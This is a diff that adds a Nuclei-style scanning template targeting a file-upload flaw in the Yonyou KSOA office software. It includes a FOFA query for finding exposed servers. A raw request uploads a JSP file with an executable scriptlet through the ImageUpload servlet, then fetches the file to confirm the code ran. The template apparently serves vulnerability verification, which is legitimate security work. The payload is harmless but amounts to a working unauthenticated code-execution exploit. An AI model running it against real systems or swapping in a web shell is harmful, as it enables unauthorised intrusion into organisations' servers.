@@ -1,0 +1,44 @@
+id: poc-local-oa-yonyou-ksoa-ImageUpload-fileupload
+
+info:
+  name: poc-local-oa-yonyou-ksoa-ImageUpload-fileupload
+  author: capiton
+  severity: critical
+  description: "用友时空KSOA软件前台文件上传漏洞"
+  reference:
+    - "https://mp.weixin.qq.com/s/WscKCWOr391Cm5cn80WfYg"
+  metadata:
+    fofa-query: app="用友-时空KSOA"
+    Vulnerability-Impact: 用友-时空KSOA
+  tags: yonyou,oa
+
+variables:
+  file_name: "{{to_lower(rand_text_alpha(8))}}.jsp"
+  file_content: "{{to_lower(rand_text_alpha(26))}}"
+requests:
+  - raw:
+      - |
+        POST /servlet/com.sksoft.bill.ImageUpload?filepath=/&filename={{file_name}} HTTP/1.1
+        Host: {{Hostname}}
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Accept-Encoding: gzip, deflate
+        Content-Type: multipart/form-data; boundary=---------------------------122739796041499160471980406311
+        Origin: null
+        Upgrade-Insecure-Requests: 1
+
+        <% out.println("{{file_content}}");%>
+      - |
+        GET /pictures/{{file_name}} HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: body
+        words:
+          - "{{file_content}}"
